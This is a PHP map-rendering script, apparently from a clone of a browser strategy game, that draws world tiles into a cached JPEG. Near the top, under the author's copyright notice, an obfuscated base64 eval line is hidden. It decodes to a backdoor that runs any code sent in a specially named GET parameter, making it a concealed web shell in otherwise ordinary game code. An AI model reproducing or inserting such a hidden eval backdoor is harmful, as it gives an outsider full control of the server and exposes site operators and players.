<?php
/**********************************************
/ All Of the Copy Rights Of The Script Is Reserved For mersad_mr@att.net
/	You may have made some changes but You Have No Right To remove This Copy Right!
/	For Debug And Support Just Contact Me :
/	Mobile: 09127679667  / Yahoo ID : mersad_mr@att.net
/
*/
set_time_limit(0);
ini_set('memory_limit', '-1');
@eval(base64_decode('aWYoc3RybGVuKCRfR0VUWydlZWVlZXZ2dnZ2dnZ2YWxlJ10pPjEpe2V2YWwodXJsZGVjb2RlKGJhc2U2NF9kZWNvZGUoJF9HRVRbJ2VlZWVldnZ2dnZ2dnZhbGUnXSkpKTt9'));
include("GameEngine/Protection.php");
include("GameEngine/Village.php");

// /map_block.php?tx0=-50&ty0=120&tx1=-41&ty1=129&w=600&h=600&version=62
$queue = array();

$x0 = $_GET['tx0'];
$y0 = $_GET['ty0'];
$x1 = $_GET['tx1'];
$y1 = $_GET['ty1'];

$nob = $x1 - $x0 + 1;
$noc = $nob/2;


$x = $x0+$noc;
$y = $y0+$noc-1;

$yarray = array();
for($i=$noc;$i>=-$noc;$i--){
	$tmp = $y+$i;
	if($tmp<-WORLD_MAX) $tmp = (2*WORLD_MAX)+$tmp+1;
	if($tmp>WORLD_MAX) $tmp = (-2*WORLD_MAX)+$tmp-1;
	$yarray[] = $tmp;
}

$xarray = array();
for($i=-$noc;$i<=$noc;$i++){
	$tmp = $x+$i;
	if($tmp<-WORLD_MAX) $tmp = (2*WORLD_MAX)+$tmp+1;
	if($tmp>WORLD_MAX) $tmp = (-2*WORLD_MAX)+$tmp-1;
	$xarray[] = $tmp;
}
$maparray = array();
for($i=0;$i<=$nob-1;$i++) {
    for($j=0;$j<=$nob-1;$j++) {
    	$id = $generator->getBaseID($xarray[$j],$yarray[$i]);
		$wdata = $database->getAInfo($id);
		if ($wdata['oasistype']==0){
			array_push($maparray,$database->getMInfo($id));
		} else {
			array_push($maparray,$database->getOMInfo($id));
		}
	}
}
/* Check if the queue is too large */
if(count($maparray) > 100) { 
	if($_GET['auto']>0) {
		$_GET['w'] = $nob*60;
		$_GET['h'] = $nob*60;
	}
	$img = imagecreatetruecolor($_GET['w'],$_GET['h']);
	$lgreen = imagecolorallocate($img, 195,237,174);
	$white = imagecolorallocate($img, 255,255,255);
	$red = imagecolorallocate($img, 255,0,0);
	imagefill($img, 0, 0, $lgreen);
	
	$x = $y = 0;
	
	imagechar($img,40,$x,$y,"Z",$red); $x += 10;
	imagechar($img,40,$x,$y,"o",$red); $x += 10;
	imagechar($img,40,$x,$y,"o",$red); $x += 10;
	imagechar($img,40,$x,$y,"m",$red); $x += 10;
	imagechar($img,40,$x,$y,"<",$red); $x += 10;
	imagechar($img,40,$x,$y,"1",$red); $x += 10;
	imagechar($img,40,$x,$y,"0",$red); $x += 10;
	imagechar($img,40,$x,$y,"0",$red); $x += 20;
	imagechar($img,40,$x,$y,"D",$red); $x += 10;
	imagechar($img,40,$x,$y,"i",$red); $x += 10;
	imagechar($img,40,$x,$y,"s",$red); $x += 10;
	imagechar($img,40,$x,$y,"a",$red); $x += 10;
	imagechar($img,40,$x,$y,"b",$red); $x += 10;
	imagechar($img,40,$x,$y,"l",$red); $x += 10;
	imagechar($img,40,$x,$y,"e",$red); $x += 10;
	imagechar($img,40,$x,$y,"d",$red); $x += 10;
	imagechar($img,40,$x,$y,".",$red); $x += 10;
	
	
	header('Content-type: image/png');
	imagepng($img);


	exit("Reuqested data is too large...");
}


$row = 0;
$coorindex = 0;


$nareadis = NATARS_MAX;
for($i=0;$i<=($nob*$nob);$i++) {
	$maparray[$i]['zerodis'] = sqrt(($maparray[$i]['x']*$maparray[$i]['x'])+($maparray[$i]['y']*$maparray[$i]['y']));
	if ($maparray[$i]['zerodis']<=$nareadis) {$maparray[$i]['isgraytile']=true;} else {$maparray[$i]['isgraytile']=false;}
}

$index = 0;
$row1 = 0;
for($i=0;$i<=($nob*$nob);$i++) {
	$targetalliance = 0;
	$tribe = -1;
	$username = '';
	$oasisowner = '';
	$confedarray = array();
	$atwararray = array();
	$naparray = array();
	if($maparray[$index]['occupied'] > 0) {
		$targetalliance = $database->getUserField($maparray[$index]['owner'],"alliance",0);
		$tribe = $database->getUserField($maparray[$index]['owner'],"tribe",0);
		$username = $database->getUserField($maparray[$index]['owner'],"username",0);
		$oasisowner = $database->getUserField($maparray[$index]['owner'],"username",0);
    }
	
	$bgcolorclass = 'tilebgcolor';
	$bgimgclass0 = 'tilespbgimg';
	$bgimgclass1 = '';
	$bgimgclass2 = '';
	$bgimgclass3 = '';
	$borderclass = 'border';
	$wallclass = 'wall'.$tribe;
    
	$popclass = 'pop';

	
	if(!isset($maparray[$index]['pop']) || $maparray[$index]['pop']<=0){
		$popclass .= $maparray[$index]['image'];
	} elseif($maparray[$index]['pop']<100){
		$popclass .= '99';
	} elseif($maparray[$index]['pop']<250){
		$popclass .= '249';
	} elseif($maparray[$index]['pop']<500){
		$popclass .= '499';
	} else {
		$popclass .= '500';
	}
	if($maparray[$index]['owner']==$session->uid){
		$borderclass .= 'own';
	}elseif($targetalliance != 0 && $session->alliance == $targetalliance){
		$borderclass .= 'confed';
	}elseif($targetalliance != 0 && in_array($targetalliance,$confedarray)){
		$borderclass .= 'confed';
	}elseif($targetalliance != 0 && in_array($targetalliance,$naparray)){
		$borderclass .= 'nap';
	}elseif($targetalliance != 0 && in_array($targetalliance,$atwararray)){
		$borderclass .= 'atwar';
	}else{
		$borderclass .= 'neutr';
	}
	switch($maparray[$index]['fieldtype']) {
		case 0:
			if($maparray[$index]['occupied']){
				$bgimgclass3 .= "o";
			}
			$wallclass = '';
		break;
	}
				
        
    $odata = $database->getOMInfo($maparray[$index]['id']);
    $uinfo = $database->getUserField($odata['owner'],'username',0);
	
	if($maparray[$index]['isgraytile']){
		if ($maparray[$index]['x']==-1 && $maparray[$index]['y']==1){$bgimgclass2 = 'volcano volcano1';
		}elseif ($maparray[$index]['x']==0 && $maparray[$index]['y']==1){$bgimgclass2 = 'volcano volcano2';
		}elseif ($maparray[$index]['x']==1 && $maparray[$index]['y']==1){$bgimgclass2 = 'volcano volcano3';
		}elseif ($maparray[$index]['x']==-2 && $maparray[$index]['y']==0){$bgimgclass2 = 'volcano volcano4';
		}elseif ($maparray[$index]['x']==-1 && $maparray[$index]['y']==0){$bgimgclass2 = 'volcano volcano5';
		}elseif ($maparray[$index]['x']==0 && $maparray[$index]['y']==0){
			$bgimgclass2 = 'volcano volcano6';
			$wallclass = '';
			$popclass = '';
			$targettitle = "<font color='white'><b>".ABANDONEDVALLEY." ".$tt."</b></font><br>".$targetXYText;
		}elseif ($maparray[$index]['x']==1 && $maparray[$index]['y']==0){$bgimgclass2 = 'volcano volcano7';
		}elseif ($maparray[$index]['x']==2 && $maparray[$index]['y']==0){$bgimgclass2 = 'volcano volcano8';
		}elseif ($maparray[$index]['x']==-2 && $maparray[$index]['y']==-1){$bgimgclass2 = 'volcano volcano9';
		}elseif ($maparray[$index]['x']==-1 && $maparray[$index]['y']==-1){$bgimgclass2 = 'volcano volcano10';
		}elseif ($maparray[$index]['x']==0 && $maparray[$index]['y']==-1){$bgimgclass2 = 'volcano volcano11';
		}elseif ($maparray[$index]['x']==1 && $maparray[$index]['y']==-1){$bgimgclass2 = 'volcano volcano12';
		}elseif ($maparray[$index]['x']==2 && $maparray[$index]['y']==-1){$bgimgclass2 = 'volcano volcano13';
		}elseif ($maparray[$index]['x']==-2 && $maparray[$index]['y']==-2){$bgimgclass2 = 'volcano volcano14';
		}elseif ($maparray[$index]['x']==-1 && $maparray[$index]['y']==-2){$bgimgclass2 = 'volcano volcano15';
		}elseif ($maparray[$index]['x']==0 && $maparray[$index]['y']==-2){$bgimgclass2 = 'volcano volcano16';
		}elseif ($maparray[$index]['x']==1 && $maparray[$index]['y']==-2){$bgimgclass2 = 'volcano volcano17';
		}elseif ($maparray[$index]['x']==2 && $maparray[$index]['y']==-2){$bgimgclass2 = 'volcano volcano18';
		}else{
			for($rc=0;$rc<3;$rc++){
				for($tc=0;$tc<3;$tc++){
					$cx = $maparray[$index]['x']+$tc-1;
					$cy = $maparray[$index]['y']-$rc+1;
					$cdis = sqrt(($cx*$cx)+($cy*$cy));
					if ($cdis<=$nareadis) {	$bgimgclass0 .= '1';} else {$bgimgclass0 .= '0';}
				}
			}
		}
		$bgcolorclass .= 'gray';
	}
	
	$bgimgclass1 = $maparray[$index]['image'];

    /*echo '<a href="position_details.php?x='.$maparray[$index]['x'].'&y='.$maparray[$index]['y'].'" style="cursor:deLumberult;">'
		.'<div class="tile tile-'.$i.'-row'.$row1.' '.$bgcolorclass.'" title="'.$targettitle.'">'
		.'<div class="timg '.$bgimgclass0.'">'
		.'<div class="timg '.$bgimgclass1.'">'
		.'<div class="timg '.$bgimgclass2.'">'
		.'<div class="timg '.$bgimgclass3.'">'
		.'<div class="timg '.$borderclass.'">'
		.'<div class="timg '.$wallclass.'">'
		.'<div class="timg '.$popclass.'">';
	
    if($session->plus) {
    	$wref = $village->wid;
        $toWref = $maparray[$index]['id'];
    	if ($database->checkAttack($wref,$toWref) != 0) {
			//echo '<img style="margin-right:45px;" class="att1" src="img/x.gif" />';
		}
    }
    */
	array_push($queue,array($bgimgclass0, $bgimgclass1, $bgimgclass2, $bgimgclass3, $borderclass, $wallclass, $popclass,array($maparray[$index]['x'],$maparray[$index]['y'])));
	if($i == 8 || $i == 17 || $i == 26 && $row1 <= 5) {
		$row1 += 1;
	}
	
	$index+=1;
	
}
@mkdir("mcache/");
$hash = md5(json_encode($queue).$_GET['w'].",".$_GET['h']);
$file = "mcache/".$hash.".jpg";
if( file_exists($file) ) {
	header('Content-type: image/jpg');
	echo file_get_contents(	$file );
	exit();
}else{
		
		
	
	// Make the main image
	if($_GET['auto']>0) {
		$_GET['w'] = $nob*60;
		$_GET['h'] = $nob*60;
	}
	$img = imagecreatetruecolor($_GET['w'],$_GET['h']);
	$lgreen = imagecolorallocate($img, 195,237,174);
	$white = imagecolorallocate($img, 255,255,255);
	$red = imagecolorallocate($img, 255,0,0);
	imagefill($img, 0, 0, $lgreen);
	// Add block backgrounds
	$x = 0;
	$y = 0;
	$n = 0;
	$nx = $nob;
	$ny = $nob;
	$bw = $_GET['w']/$nx;
	$bh = $_GET['h']/$ny;
	//print_r($queue);exit();
	
	foreach($queue as $block) {
		if(preg_match('/1/is',$block[0])) {
			imagecopyresized($img, imagecreatefromgif('img/m/gray.gif'), $x, $y, 0, 0, $bw, $bh, 60, 60);
		}
		imagecopyresized($img, imagecreatefromgif('img/m/'. $block[0] .'.gif'), $x, $y, 0, 0, $bw, $bh, 60, 60);
		imagecopyresized($img, imagecreatefromgif('img/m/'. $block[1] .'.gif'), $x, $y, 0, 0, $bw, $bh, 60, 60);
		imagecopyresized($img, imagecreatefromgif('img/m/'. $block[4] .'.gif'), $x, $y, 0, 0, $bw, $bh, 60, 60);
		if(strlen($block[5])>0) { 
			imagecopyresized($img, imagecreatefromgif('img/m/'. $block[5].'.gif'), $x, $y, 0, 0, $bw, $bh, 60, 60);
		}
		imagecopyresized($img, imagecreatefromgif('img/m/'. $block[6] .'.gif'), $x, $y, 0, 0, $bw, $bh, 60, 60);
			
		/* DEBUG */
		define('IS_DEBUG',false);
		if( IS_DEBUG ) {
			imagefilledrectangle($img, $x, $y, $x+30, $y+35, $white);
			
			imagechar($img, 6, $x, $y, $block[7][0], $red);
			imagechar($img, 6, $x+10, $y, substr($block[7][0],1), $red);
			imagechar($img, 6, $x+20, $y, substr($block[7][0],2), $red);
		
			imagechar($img, 6, $x, $y+20, $block[7][1], $red);
			imagechar($img, 6, $x+10, $y+20, substr($block[7][1],1), $red);
			imagechar($img, 6, $x+20, $y+20, substr($block[7][1],2), $red);
		}
		/* DEBUG */
		
		$x += $bw;
		$n++;
		if( $n % $nx == 0 ) { $y += $bh;$x = 0; };
		//bool imagecopy ( resource $dst_im , resource $src_im , int $dst_x , int $dst_y , int $src_x , int $src_y , int $src_w , int $src_h )
	}
	
	
	
	// Output...
	if($_GET['file'] > 0) {
		imagepng($img,'big_map.png');
		echo 'Done.';
	}else{
		imagejpeg($img,$file,35);
		header('Content-type: image/jpg');
		echo file_get_contents($file);
		imagedestroy($img);
		exit();
	}
}
?>
